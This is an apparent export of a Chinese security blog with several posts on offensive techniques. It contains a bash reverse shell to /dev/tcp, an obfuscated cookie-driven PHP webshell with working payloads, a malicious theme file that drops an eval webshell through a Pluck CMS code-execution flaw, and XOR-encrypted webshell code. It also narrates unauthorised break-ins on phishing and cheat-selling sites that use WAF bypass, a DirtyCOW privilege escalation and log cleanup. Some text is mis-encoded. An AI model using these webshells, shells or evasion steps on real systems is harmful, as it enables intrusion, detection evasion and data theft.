WhS8hZfZRv5ItXyS5qeVcEjxA9G0Yjn+eeBKMq3DTl7PJrLR0SW2UHtvFHvVW+ksW87GvhUrzHqvkMPLyAx8l5uFKSYJyOhOP/iZSyUdOoXns72Lr+Vd9PmjeSFKo30tzI8L2SEqHNDjKSMYgT9fZXtbLqinUN5U1VCZYRYPhCZzSG4ekE8Fd30AvgiWXEGhkAAnT4qSO0Rnw/OacOdrBDtzmnXmuxpOF9n1fpatEpeTq3UX5pUpbarAb8GwYYH9PF0nazW//k5p6T3ylBLDya2IMrKQfIfS9O10W4Q92sYmo7dG+dYmzhR8OXxSBQ81Y3vm9yppq7ZZBlxO5LNrPi0S/2snlCSY0VsI88R/eIR0Dk4gqyNTiJb+/sXNpgCNn5AjPRX6n/h4Ea0qFDegwAjWHm8Fuj7O5LFiVYmlpKzWOQ4Jic+xXvEAxpfewsxKpcZr++fGslsntI1+95QoHbtX1QeY3nmMCnvbdOifqrZYXkblI+CnndmYYsETQI/phRruJaUq2SGUhFOVPeFSBFwZGP0IbLq+7C3ipwR6BntN/+/AnMPqn/P5IMN7YNbCGsigx77ovBzUXJfGRj8kuYVQl+DqQd2NNwNzb52wguRfxBQXUJTiHo79keoN4WHh4T71NwDwwjYP/iUAZlPsSKwJog2triXR6BN1MzQimXHRsFIRA1QH3kcqHVxKM/zm0Zz5u8cKNdwGX+zwAIhoseWIWtYip2MbcwGEXJWH8zY5R5gPeO/j2+dSpqscREjXpkKim7wNldqPZjmaapMOTsPNjslOy+p5GK7Oo/09AINnATOKNhhEZalLXqgoi2oU0hSmTsbRsaRpzO+kkv6VOZcYcrZYPBMT9/HfDIrhdQrKmeIW+EfQPyXQw7rHR258tg0C1jXA89YTU6N6ioVkDMeRnYhC954fU5iSjJsyDAN9kg2cuIg9mU6eeWRxN4kNl/nsxEIidz+OAVCv15f+qOgHWiGyMm4g6k91kHdLpwgk9p77Ei2v18ZXIroAJutMiGDgoLpsAjccxoC6NUeEIdvO7n5aUUAElPP0FMlFGS6VnOmQxRHVay3ScUscO5xo+2mtEIDcq486OCteBXjasK2/gWieQCyPRQQE5+UvWP53Vr2l9nUGGMJSwceJu2Q6puOHhPZ5OZDxS0axzjZot1EzQDLhuOIXumtlw2u1u5yC1d02AUWihBwZUZEwqb+CgP5SeMVl9/4B/Fve/2HZ0bt8kxuC3IQNCOrkLuQ8GSOJUsvVvBqLbuH6txghV2kS4BxBmTaRT4+7DfRKEcr0w4iOSVCE7GwUFCMMN5q6efTjTwTFCgisetjDgOlGMPzQSA3l1tWlZlAST1QY7mmKhNSwow/Ewq6sIRS5vPLHxSwut77ntxTh1AILc9uJgb88FiRNhBkdElI0q5SFaFLP9NdaWow6esNDI5v+S1d1ZIgINJrTg8AMfC0Wy6hu2Ht+l2hYrOFRuQCrBVFVQLjS7biOQrQmNZGAt/kt45iLd0kUNyOMIxF2/loa0UXP+aRUeJA0D0o5pCrjiZuk0yuSy0gkQ4i6cWa0dxen44hPKo40ud7636WSdxOmlt223RA03i06HKIe+DTtgQWrsCA+hOjacw1GJJQNMzU2rdRnfHTDhJVrk8wUWglgvjsPxXT38135+DpB1atTQOnvnjrqmbBb73IhZJCJwywzh57LIUTE/oIZLtt+FQUSBbQCCfyTT1MrVGDMsuXnrHuluTPc5jJpXJ6NXc2EV7nyDrKkwmQkdKjoWd3cXPL47j/PMyoJHqb8pL1hrmtAcyknaChNfnEjWd2g9IIecBScVo1ArezK8NuQ5u2dvRhiYo9+w==]]></content>
      <categories>
        <category>技术文章</category>
      </categories>
      <tags>
        <tag>bypass</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[绕过宝塔云锁注入钓鱼站]]></title>
    <url>%2Fposts%2Fbypass-waf-and-hack-fish-site%2F</url>
    <content type="text"><![CDATA[前言某天收到一封邮件一看就是钓鱼邮件，并且我也不玩LOL。看了看感觉这个系统好像见过很多次，研究了一下，顺手日了下来过程比较有意思，遇到了不少坑，写篇文章记录一下。正文信息搜集打开网站首先我们可以看到他的炫酷界面进一步搜集信息发现有宝塔+云锁，找不到后台，旁站全是这种钓鱼站，均使用了冒充官网的子域名前缀手工试了下发现有注入，但是有云锁万能Bypass还是利用星球里提过的方法来bypass构造好post包后用sqlmap跑，发现有布尔盲注本来以为就要完事了，结果sqlmap最后提示注入失败emmmmmm，看一下发现被封了IP换个IP后，增大delay的数值，想了想他有可能是根据XFF来判断来源IP的，就又加了个tamper=xforwardedfor.py哈，本来可高兴了，以为完事了结果发现跑不出来数据exm???遇到的坑在从确认有注入到真正能跑出来的期间遇到了好多坑。。。花了一下午时间才一个一个解决第一个坑：sqlmap的payload无法加载抓包看一下，发现sqlmap的payload无法被加载到数据包里相当于一直发送的都是没有payload的数据包，所以肯定注不出来。具体原因不知道为什么，但是可以做一个猜想：可能是构造的垃圾数据过多，文件过大，导致sqlmap还没来得及替换payload数据包就发出去了解决办法就是减小数据包长度，然后抓包调整最后发现30kb是个界限，刚好是sqlmap能发出去包，并且云锁跟宝塔不会拦截。第二个坑：win下网络阻塞强制关闭sqlmap了几次，然后就发现网络阻塞，数据包在win环境下发不出去解决办法就是换kali。第三个坑：sqlmap提示发现有无法识别的字符，解决办法是采用--hex柳暗花明解决完上面的坑后，终于可以出数据了跑了漫长的一个小时。。。终于跑出来了当前的用户名。。。然后是跑表名因为跑起来实在太慢了，后面就懒得跑了。最后面对这种邮件大家要提高警惕，一定要检查发件人跟域名是否是官方。一旦遇到钓鱼邮件立马举报，防止更多的人上当。]]></content>
      <categories>
        <category>技术文章</category>
      </categories>
      <tags>
        <tag>bypass</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[反弹Shell升级为交互式Shell]]></title>
    <url>%2Fposts%2Fshell-to-tty%2F</url>
    <content type="text"><![CDATA[前言看hack the box的视频的时候，发现ippsec不喜欢用蚁剑，喜欢弹个shell回来。然后一顿操作把一个简单的shell就升级到了一个标准交互式shell写这篇文章记录一下正文攻击机：kali靶机：ubuntu首先ubuntu建一个新用户：test，密码 test普通Shell给kali弹shell1bash -i &gt;&amp; /dev/tcp/192.168.145.128/4444 0&gt;&amp;1kali1nc -lvvp 4444然后发现这个shell有很多问题无法使用vim等文本编辑器不能补全不能su没有向上箭头使用历史等等半交互式Shell对于已经安装了python的系统，我们可以使用python提供的pty模块，只需要一行脚本就可以创建一个原生的终端，命令如下：1python -c &apos;import pty; pty.spawn(&quot;/bin/bash&quot;)&apos;在创建完成后，我们此时就可以运行su命令了但是还是存在很多问题无法使用vim等文本编辑器不能补全没有向上箭头使用历史完全交互式Shell命令：1234567$ python -c &apos;import pty; pty.spawn(&quot;/bin/bash&quot;)&apos;Ctrl-Z$ stty raw -echo$ fg$ reset$ export SHELL=bash//$ export TERM=xterm-256color此时已经拥有了一个完全交互式Shell，就可以使用上下左右，vi，tab补全等等一系列操作，并且按Ctrl-c也不会退出。相关命令解析1234567891011121314151617stty -echo #禁止回显，当在键盘上输入时，并不出现在屏幕上stty echo #打开回显stty raw #设置原始输入stty -raw #关闭原始输入bg将一个在后台暂停的命令，变成继续执行fg将后台中的命令调至前台继续运行jobs查看当前有多少在后台运行的命令ctrl + z可以将一个正在前台执行的命令放到后台，并且暂停clear这个命令将会刷新屏幕，本质上只是让终端显示页向后翻了一页，如果向上滚动屏幕还可以看到之前的操作信息。 reset这个命令将完全刷新终端屏幕，之前的终端输入操作信息将都会被清空参考链接https://www.freebuf.com/news/142195.html]]></content>
      <categories>
        <category>技术文章</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[某Shell分析以及自己的一些想法]]></title>
    <url>%2Fposts%2Fan-interesting-shell%2F</url>
    <content type="text"><![CDATA[前言123&lt;?php$p=$_COOKIE;(count($p)==23&amp;&amp;in_array(gettype($p).count($p),$p))?(($p[59]=$p[59].$p[72])&amp;&amp;($p[91]=$p[59]($p[91]))&amp;&amp;($p=$p[91]($p[90],$p[59]($p[31])))&amp;&amp;$p()):$p;?&gt;星球里有很多同学想让我对这个shell写一篇解析，看了下确实比较有意思，并且顺便也想讲一些自己的想法。语法分析比较复杂的样子，一点点看吧。首先pç­ä»·äºcookie数组，属性是一个array。后面一长串其实是个三段式第一部分：条件1(count($p)==23&amp;&amp;in_array(gettype($p).count($p),$p))也就是说$p这个字典的长度要必须是23，并且gettype($p).count($p)拼接后的值必须在$p这个字典里。因为$p是array，count($p)=23，所以也就是说cookie中必须有一个值是array23第二部分：条件成立时执行1(($p[59]=$p[59].$p[72])&amp;&amp;($p[91]=$p[59]($p[91]))&amp;&amp;($p=$p[91]($p[90],$p[59]($p[31])))&amp;&amp;$p())注意这里已经出现了变量函数的部分了 ,这两句将是后面讲的重点$p[59]($p[91]) 可以变为 assert($_POST['cmd'])等等$p=$p[91]($p[90],$p[59]($p[31])) 可以变为create_function('',eval($_POST[cmd]))等等第三部分：条件不成立时执行这部分没卵用。Payload这是某论坛大佬给出的payload可以看到是相当于拼接了一个eval(strrev(倒置的create_function(,eval($_POST[cmd]))))(差不多这个意思)然后就可以用密码是cmd的一句话连接了。但是想一想，因为里面有大量的可控参数，所以其实有很多玩法。举几个例子最短的用法，91处直接写命令为了方便我把$p给var_dump了出来1Cookie: 1; 2; 3; 4; 5; 6; 7; 8; 9; 10; 11; 12; 13; 14; 15; 16; 17; 18=array23; 19; 20; 59=assert; 72=; 91=phpinfo();还可以通过GET传参1Cookie: 1; 2; 3; 4; 5; 6; 7; 8; 9; 10; 11; 12; 13; 14; 15; 16; 17; 18=array23; 19; 20; 59=assert; 72=; 91=@eval($_GET[a]);当然也可以改成POST，用蚁剑连接1Cookie: 1; 2; 3; 4; 5; 6; 7; 8; 9; 10; 11; 12; 13; 14; 15; 16; 17; 18=array23; 19; 20; 59=assert; 72=; 91=@eval($_POST[a]);直接在cookie里明文出现@eval($_POST[a]);肯定是不太好的，容易被拦截。我们别忘了第二处出现变量函数的地方1($p=$p[91]($p[90],$p[59]($p[31])))&amp;&amp;$p())这里可以满足我们的各种编码需求。论坛中的payload是用strrev函数编码过的，也就是字符串反转，我们当然也可以用其他的比如base641Cookie: 1; 2; 3; 4; 5; 6; 7; 8; 9; 10; 11; 12; 13; 14; 15; 16; 17; 18=array23; 31=ZXZhbChwaHBpbmZvKCkpOw==; 90; 59=base64_; 72=decode; 91=Y3JlYXRlX2Z1bmN0aW9u;其中31是eval(phpinfo()); 91是create_function转化成蚁剑能够连接的一句话也就是把31处改为eval($_POST[cmd]);的base64编码，注意这里最后一定要加分号。然后用蚁剑连接就可以了。反思扩展总结一下这个shell构思的巧妙之处shell没有明显的eval assert $_POST $_GET等常规特征动态函数的形式，可以用多种编码进行传输payload用cookie传payload，在一定程度上逃避WAF常见的POST跟GET型流量查杀这里就想到一个问题，在网络对♂抗的时候经常有人发出疑问：我的shell是免杀的，我的马也藏得很深，但是为什么我的shell总是能被对方找到？尽管你的shell是免杀的，也藏在了很深的目录，也有可能你的流量也是层层编码过的，但是常见的一句话连接工具不管是菜刀还是蚁剑还是冰蝎也好，都难逃一个特点就是POST传输。因为正常的业务中，大多数情况下都是只需GET请求，只有修改或者上传等操作的时候才需要POST。但是一旦你的shell连接上后，你在蚁剑中的每个操作，每个查询，都会对应一次甚至多次POST发包。就更别说你需要在靶机上继续进行信息搜集等操作了，点的越多，流量日志记录的就越多。日志中看到某一个文件短时间内被同一IP连着POST了几十次，用脚趾头想想就知道有问题。。。然而大多数人并不懂得如何正确擦屁股。所以在我看来，以后的方向可能就是GET请求+cookie或者http头传输payload。kali上著名的工具weevely也是采用了GET传payload的模式：Weevely命令传输分析但是命令行总是不方便，如果能够用拓展性强大的蚁剑能实现就好了。那么如何实现呢?这个等我学会了再给大家分享。。。。。。留下了不学无术的泪水.jpg]]></content>
      <categories>
        <category>技术文章</category>
      </categories>
      <tags>
        <tag>webshell</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[bypass宝塔上传]]></title>
    <url>%2Fposts%2Fbt-bypass-upload%2F</url>
    <content type="text"><![CDATA[此文章已被加密。 Incorrect Password! No content to display! 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]]></content>
      <categories>
        <category>技术文章</category>
      </categories>
      <tags>
        <tag>bypass</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[向吃鸡外挂站开炮（三）]]></title>
    <url>%2Fposts%2Fhack-pubg-cheat-site-3%2F</url>
    <content type="text"><![CDATA[[向吃鸡外挂站开炮（一）](https://yzddmr6.tk/posts/hack-pubg-cheat-site-1/) [向吃鸡外挂站开炮（二）](https://yzddmr6.tk/posts/hack-pubg-cheat-site-2/)前言第三篇终于写好了，也算是比较有意思的一篇，遇到了很多坑，也用上了很多小技巧，写出来博君一笑。正文毫无套路的炫酷界面琳琅满目的商品列表这种卖黑号的通常都是跟各种hc商勾结在一起，用木马盗取用户账号，然后再出售账号让孤儿开挂。Getshellgetshell的过程懒得再复现一遍了，直接说思路吧。发现用的是一套已知的发卡系统，Fi9coder刚好在我星球里发过此发卡系统的漏洞合集。自己也审了一下，确实漏洞比较多。随便找一处submit.php里直接把$gid带入数据库查询，产生注入然后到后台logo处未过滤直接可以上传shell理论上很简单，但是实际上遇到了一些坑。第一个是对方似乎开了宝塔的防护，注入跟上传都会被拦截。我用的绕过办法是，注入用的参数污染，上传用的星球里嘉宾九世分享的bypass宝塔上传方法，换行绕过，一句话用的webshell-venom。第二个是找不到后台解决办法是找到他的一个旁站，然后谷歌找到了他旁站的后台。国外服务器，旁站都是这种乱七八糟的非法站，用的都是同一套有漏洞的系统。猜想可能都是这个后台，果然如此比较有意思，后台地址是 /sima ，看来站长也知道自己是个什么东西。拿着注入出来的账号密码就进去了Bypass disable function确实是getshell了，但是连接的时候出了问题，蚁剑连接的时候一直转圈圈发现是流量被检测后直接封ip了。因为用的webshell-venom生成的马，兼容流量编码，所以开始解决办法是传一个id参数，然后用蚁剑的base64-bypass编码器，把所有的payload都base64一遍。结果后面发现连接了一会儿又被封了。。。。再换上用自己写的蚁剑参数污染模块，总算是不被封了。。。宝塔默认会禁用系统函数，需要Bypass disable function用蚁剑自带的bypass插件发现因为宝塔的原因，会直接拦截上传的php解决办法是代理到burp后把payload抠出来，手动上传。(我也不知道为什么自动上传不行手动就可以了。。。)成功执行命令曲折的提权发现是2015的内核后笑开了花，脏牛一把梭走起。首先弹个msf回来，这样就可以有交互式shell但是发现firefart的exp会直接把系统搞崩。。。服务器直接挂了本来以为是偶然情况，等到第二天服务器又恢复了又提了一次结果还是宕机。。。所以又等了一天。。。冷静分析一下，首先脏牛是肯定可以打的，因为内核版本确实在脏牛攻击范围内，并且firefart的exp确实有回显。因为firefart是直接给你一个加了一个用户，并不会主动返回root权限的shell，需要你su切换或者去登录，猜想可能在覆盖的过程中造成了内核crash就宕机了。猜想是否可以用直接返回root shell的exp来解决。explit-db找到了这一个 https://www.exploit-db.com/exploits/40847编译一下，加个-s参数保存/etc/passwd文件看到了久违的root拿下宝塔先把他的passwd给恢复回去，不然一会儿机器又崩了就打不开了找到存有宝塔密码的数据库1/www/server/panel/data/default.db同目录admin_path.pl下找到面板路径扔到somd5里解密成功进入面板其实进面板的时候怕他绑了微信有提醒，结果没有，哈哈发现管理员登录IP查一下地址是福建的拿到数据库root密码(虽然没啥用)到此已经拿下服务器所有权限，清除痕迹擦屁股走人。最后有些图是后来补的，如果觉得有说的不对的地方欢迎跟我交流。法律红线切不可碰，证据全部打包，提交给网警同志。最后，吐槽一句吃鸡外挂越来越多了，越来越没游戏体验了。]]></content>
      <categories>
        <category>技术文章</category>
      </categories>
      <tags>
        <tag>渗透测试</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[蚁剑编码器之流量混淆]]></title>
    <url>%2Fposts%2Fant-mass-bypass%2F</url>
    <content type="text"><![CDATA[此文章已被加密。 Incorrect Password! No content to display! ]]></content>
      <categories>
        <category>技术文章</category>
      </categories>
      <tags>
        <tag>中国蚁剑</tag>
        <tag>bypass</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Pluck CMS后台另两处任意代码执行]]></title>
    <url>%2Fposts%2Fpluck-cms-getshell%2F</url>
    <content type="text"><![CDATA[前言本来是在cnvd上看到了有人发Pluck CMS的洞，但是没有公开细节，便想着自己挖一下。但是审完第一个后发现已经有两位同学写出来了Pluck CMS 4.7.10远程代码执行漏洞分析Pluck CMS 4.7.10 后台 文件包含+文件上传导致getshell代码分析当时自己的思路跟第一个同学一样，第二个同学的思路自己确实没有想到，佩服佩服。但是心有不甘，自己就继续挖掘了一下，又发现了两处可以任意命令执行的地方。正文第一处：过滤不严导致单引号逃逸这个跟第一篇思路一样，只不过找到了另一处未过滤的点在function.php里面blog_save_post()函数12345678910111213141516171819202122232425262728293031323334353637383940414243444546function blog_save_post($title, $category, $content, $current_seoname = null, $force_time = null) &#123; //Check if &apos;posts&apos; directory exists, if not; create it. if (!is_dir(BLOG_POSTS_DIR)) &#123; mkdir(BLOG_POSTS_DIR); chmod(BLOG_POSTS_DIR, 0777); &#125; //Create seo-filename $seoname = seo_url($title); //Sanitize variables. $title = sanitize($title, true); $content = sanitizePageContent($content, false); if (!empty($current_seoname)) &#123; $current_filename = blog_get_post_filename($current_seoname); $parts = explode(&apos;.&apos;, $current_filename); $number = $parts[0]; //Get the post time. include BLOG_POSTS_DIR.&apos;/&apos;.$current_filename; if ($seoname != $current_seoname) &#123; unlink(BLOG_POSTS_DIR.&apos;/&apos;.$current_filename); if (is_dir(BLOG_POSTS_DIR.&apos;/&apos;.$current_seoname)) rename(BLOG_POSTS_DIR.&apos;/&apos;.$current_seoname, BLOG_POSTS_DIR.&apos;/&apos;.$seoname); &#125; &#125; else &#123; $files = read_dir_contents(BLOG_POSTS_DIR, &apos;files&apos;); //Find the number. if ($files) &#123; $number = count($files); $number++; &#125; else $number = 1; if (empty($force_time)) $post_time = time(); else $post_time = $force_time; &#125; //Save information. $data[&apos;post_title&apos;] = $title; $data[&apos;post_category&apos;] = $category; $data[&apos;post_content&apos;] = $content; $data[&apos;post_time&apos;] = $post_time; save_file(BLOG_POSTS_DIR.&apos;/&apos;.$number.&apos;.&apos;.$seoname.&apos;.php&apos;, $data); //Return seoname under which post has been saved (to allow for redirect). return $seoname;&#125;其中1234$data[&apos;post_title&apos;] = $title; $data[&apos;post_category&apos;] = $category; $data[&apos;post_content&apos;] = $content; $data[&apos;post_time&apos;] = $post_time;$title content åè¢«è¿æ»¤ï¼post_time不可控，$category可控所以只要把$cont2变成我们的payload即可第二处：安装模版+文件包含导致任意命令执行很多CMS都会在安装模版的时候getshell，那么这里笔者也发现了类似的漏洞。直接访问失败首先准备一个shell.php里面是我们的phpinfo();然后打包成shell.zip，直接上传主题发现确实上传并且解压成功但是由于目录下有.htaccess文件，直接把php设置为不可解析，所以无法直接访问文件包含突破所以就想到需要找一个位置对其进行包含，来达到执行的目的。首先看到admin.php中关于theme的部分跟进 data/inc/theme.php，发现调用了get_themes()方法跟进 functions.all.php，查看get_themes()方法123456789101112131415161718function get_themes() &#123; $dirs = read_dir_contents(&apos;data/themes&apos;, &apos;dirs&apos;); if ($dirs) &#123; natcasesort($dirs); foreach ($dirs as $dir) &#123; if (file_exists(&apos;data/themes/&apos;.$dir.&apos;/info.php&apos;)) &#123; include_once (&apos;data/themes/&apos;.$dir.&apos;/info.php&apos;); $themes[] = array( &apos;title&apos; =&gt; $themename, &apos;dir&apos; =&gt; $dir ); &#125; &#125; return $themes; &#125; else return false;&#125;发现会遍历data/themes/下所有主题目录，并且包含他的info.php文件此时info.php可控，就导致了任意代码执行。利用方法首先准备一个info.php123&lt;?phpfile_put_contents(&apos;x.php&apos;,base64_decode(&apos;PD9waHAgQGV2YWwoJF9HRVRbJ21yNiddKTs/Pg==&apos;));?&gt;然后打包压缩成shell.zip上传安装主题，然后点击回到主题页，此时触发文件包含。然后根目录下就会生成我们的一句话x.php，密码是mr6最后本人水平有限，文笔较差，如果有什么写的不对的地方还希望大家能够不吝赐教]]></content>
      <categories>
        <category>技术文章</category>
      </categories>
      <tags>
        <tag>代码审计</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[蚁剑实现动态秘钥编码器解码器]]></title>
    <url>%2Fposts%2Fantsword-xor-encoder%2F</url>
    <content type="text"><![CDATA[前言最近研究了一下蚁剑PHP的RSA和AES编码器，发现都是需要开启openssl扩展才可以使用但是这个模块大多数情况下是不开的，所以就导致蚁剑的强加密类型的编码器、解码器无法使用于是借鉴了一下冰蝎的思路，实现了一个动态秘钥的编码器解码器。冰蝎的解决方案我记得冰蝎在1.0版本有同样的问题，模块不开shell就用不了，但是2.0就解决了这个问题。那么冰蝎是怎么解决的呢。看一下他的shell.php是怎么写的123456789101112131415161718192021222324252627282930313233&lt;?php@error_reporting(0);session_start();if (isset($_GET[&apos;pass&apos;]))&#123; $key=substr(md5(uniqid(rand())),16); $_SESSION[&apos;k&apos;]=$key; print $key;&#125;else&#123; $key=$_SESSION[&apos;k&apos;]; $post=file_get_contents(&quot;php://input&quot;); if(!extension_loaded(&apos;openssl&apos;)) &#123; $t=&quot;base64_&quot;.&quot;decode&quot;; $post=$t($post.&quot;&quot;); for($i=0;$i&lt;strlen($post);$i++) &#123; $post[$i] = $post[$i]^$key[$i+1&amp;15]; &#125; &#125; else &#123; $post=openssl_decrypt($post, &quot;AES128&quot;, $key); &#125; $arr=explode(&apos;|&apos;,$post); $func=$arr[0]; $params=$arr[1]; class C&#123;public function __construct($p) &#123;eval($p.&quot;&quot;);&#125;&#125; @new C($params);&#125;?&gt;注意看这一段12345678910if(!extension_loaded(&apos;openssl&apos;)) &#123; $t=&quot;base64_&quot;.&quot;decode&quot;; $post=$t($post.&quot;&quot;); for($i=0;$i&lt;strlen($post);$i++) &#123; $post[$i] = $post[$i]^$key[$i+1&amp;15]; &#125; &#125; else xxxxxx如果没有openssl扩展，那么就把postçåå®¹è·éæºç§é¥key异或一遍相当于自己写了个加密函数。那么当然蚁剑也可以利用此思路来解决此问题。如何生成随机秘钥冰蝎的做法是先请求两次shell(因为第二次请求的时候才会将秘钥保存到session中)如果请求中有pass=xxx就返回一个十六位的随机秘钥然后客户端跟服务端分别记下这个秘钥，用于后面流量的加密解密。但是也带来一个问题，握手获得秘钥的过程已经成为了很多WAF检测的特征。冰蝎动态二进制加密WebShell特征分析如何规避特征当然我们可以用PHPSESSID来作为秘钥，蚁剑的AES编码器也是这么做的。但是因为蚁剑的机制里面没有自动获取cookie这一个操作所以需要你人工浏览网站-&gt;获取cookie-&gt;填入配置文件才可以使用，但是太过麻烦。那么我们能否设置一个不需要握手，并且很容易就可以获得的随机秘钥呢于是想到可以我们可以用时间时间格式的选择时间也有很多种格式，选择哪一种呢？想到如果时间中带有秒的话，很容易发个包过去就错过同一时间了，无法完成加解密。所以我们可以采用年-月-日 